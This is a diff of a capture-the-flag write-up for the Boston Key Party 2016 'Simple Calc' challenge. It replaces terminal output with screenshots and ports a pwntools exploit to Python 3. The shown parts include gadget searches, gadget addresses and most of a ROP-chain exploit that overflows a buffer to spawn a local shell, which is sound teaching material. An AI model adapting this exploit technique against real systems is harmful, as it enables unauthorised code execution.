@@ -1,35 +1,14 @@
 # Boston Key Part 2016 Simple Calc
 
+This was done on `Ubuntu 20.04.4 LTS`.
+
 Let's take a look at the binary:
 
-```
-$    file simplecalc
-simplecalc: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=3ca876069b2b8dc3f412c6205592a1d7523ba9ea, not stripped
-$    pwn checksec simplecalc
-[*] '/Hackery/pod/modules/bof_static/bkp16_simplecalc/simplecalc'
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-$    ./simplecalc  
-    |#------------------------------------#|
-    |         Something Calculator         |
-    |#------------------------------------#|
+![pwn_file](pics/pwn_file.png)
 
-Expected number of calculations: 50
-Options Menu:
- [1] Addition.
- [2] Subtraction.
- [3] Multiplication.
- [4] Division.
- [5] Save and Exit.
-=> 1
-Integer x: 1
-Integer y: 1
-Do you really need help calculating such small numbers?
-Shame on you... Bye
-```
+And when we run it:
+
+![run](pics/run.png)
 
 So we can see that it is a 64 bit statically linked binary. The only binary mitigation it has is a Non-Executable stack so we can't push shellcode onto the stack and call it. When we run it, we see that it prompts us for a number of calculations. Then it allows us to do a number of calculations. Also it apparently won't let us calculate "small numbers". When we take a look at the main function in Ghidra (for me it was under a folder called `mai...`), we see this:
 
@@ -116,12 +95,7 @@ So we can see that it starts of by prompting us for a number of calculations wit
 
 Here it is essentially allocating `numberCalcs` number of integers, which each of them are four bytes big. Then it will enter into a while loop that will run once for each calculation we will specify (unless if we choose to exit early). Looking at the assembly code (since the decompilation looks a bit weird) for the multiplication section, we see that it is calling the `muls` function:
 
-```
-        004014d3 83 f8 03        CMP        calculations,0x3
-        004014d6 75 23           JNZ        LAB_004014fb
-        004014d8 e8 cb fd        CALL       muls                                             undefined muls()
-                 ff ff
-```
+![muls](pics/muls.png)
 
 When we look at the `muls`function, we see that it checks to ensure that the two numbers have to be equal to or greater than `0x27`. Looking at it, we see that it pretty much just multiplies the two numbers together. Looking at the other three calculation operations, they seem pretty similar (except for subtraction, addition, and division).
 
@@ -300,7 +274,7 @@ $ python ROPgadget.py --binary simplecalc | grep "pop rdx ; ret"
 So we can see the gadgets for controlling the four registers are at `0x44db34`, `0x401b73`, `0x401c87`, and `0x437a85`. Now we need a gadget that will write an eight byte value to a memory region. For this I would like to start my search by searching through the gadgets with `mov` in them:
 
 ```
-$ python ROPgadget.py --binary simplecalc | grep "mov" | less
+$   python3 ROPgadget.py --binary simplecalc | grep "mov" | less
 ```
 
 after a bit of searching, we find this gadget:
@@ -312,7 +286,7 @@ after a bit of searching, we find this gadget:
 This gadget will move the four byte value from `rdx` to whatever memory is pointed to by `rax`. This is exactly what we need, and a bit convenient since we already have the gadgets for those two registers and this gadget doesn't do anything else that we need to worry about. The last gadget we need will be a `syscall` gadget:
 
 ```
-$ python ROPgadget.py --binary simplecalc | grep ": syscall"
+$   python3 ROPgadget.py --binary simplecalc | grep ": syscall"
 0x0000000000400488 : syscall
 ```
 
@@ -402,8 +376,8 @@ from pwn import *
 target = process('./simplecalc')
 #gdb.attach(target, gdbscript = 'b *0x40154a')
 
-target.recvuntil('calculations: ')
-target.sendline('100')
+target.recvuntil(b'calculations: ')
+target.sendline(b'100')
 
 # Establish our rop gadgets
 popRax = 0x44db34
@@ -418,22 +392,22 @@ syscall = 0x400488
 
 # These two functions are what we will use to give input via addition
 def addSingle(x):
-  target.recvuntil("=> ")
-  target.sendline("1")
-  target.recvuntil("Integer x: ")
-  target.sendline("100")
-  target.recvuntil("Integer y: ")
-  target.sendline(str(x - 100))
+  target.recvuntil(b"=> ")
+  target.sendline(b"1")
+  target.recvuntil(b"Integer x: ")
+  target.sendline(b"100")
+  target.recvuntil(b"Integer y: ")
+  target.sendline(bytes(str(x - 100), 'utf-8'))
 
 
 def add(z):
   x = z & 0xffffffff
-  y = ((z & 0xffffffff00000000) >> 32)
+  y = ((z & 0xffffffff00000000) >> 32) 
   addSingle(x)
   addSingle(y)
 
 # Fill up the space between the start of our input and the return address
-for i in xrange(9):
+for i in range(9):
   # Fill it up with null bytes, to make the ptr passed to free be a null pointer
   # So free doesn't crash
   add(0x0)
@@ -473,7 +447,7 @@ add(0x0)
 
 add(syscall) # Syscall instruction
 
-target.sendline('5') # Save and exit to execute memcpy and trigger buffer overflow
+target.sendline(b'5') # Save and exit to execute memcpy and trigger buffer overflow
 
 # Drop to an interactive shell to use our new shell
 target.interactive()
@@ -481,24 +455,6 @@ target.interactive()
 
 When we run the exploit:
 
-```
-$ python exploit.py
-[+] Starting local process './simplecalc': pid 15676
-[*] Switching to interactive mode
-Result for x + y is 0.
-
-Options Menu:
- [1] Addition.
- [2] Subtraction.
- [3] Multiplication.
- [4] Division.
- [5] Save and Exit.
-=> $ w
- 20:06:39 up  5:53,  1 user,  load average: 1.71, 1.30, 1.37
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-guyinatu :0       :0               14:13   ?xdm?  22:10   0.00s /usr/lib/gdm3/gdm-x-session --run-script env GNOME_SHELL_SESSION_MODE=ubuntu gnome-session --session=ubuntu
-$ ls
-core  exploit.py  readme.md  simplecalc
-```
+![running_exploit](pics/running_exploit.png)
 
 Just like that, we popped a shell!
